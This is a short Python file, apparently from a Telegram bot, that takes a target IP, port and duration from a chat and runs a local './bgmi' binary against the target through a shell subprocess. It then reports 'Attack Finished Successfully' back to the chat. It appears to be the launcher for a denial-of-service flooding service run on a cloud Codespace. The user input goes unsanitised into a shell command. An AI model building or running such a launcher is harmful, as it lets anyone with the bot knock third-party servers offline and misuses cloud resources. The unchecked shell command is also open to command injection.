# attack.py
import asyncio
import logging
from telebot import TeleBot

# Async function to run attack command
async def run_attack_command_on_codespace(bot: TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
    command = f"./bgmi {target_ip} {target_port} {duration} 12"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

        # Notify user when the attack finishes
        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
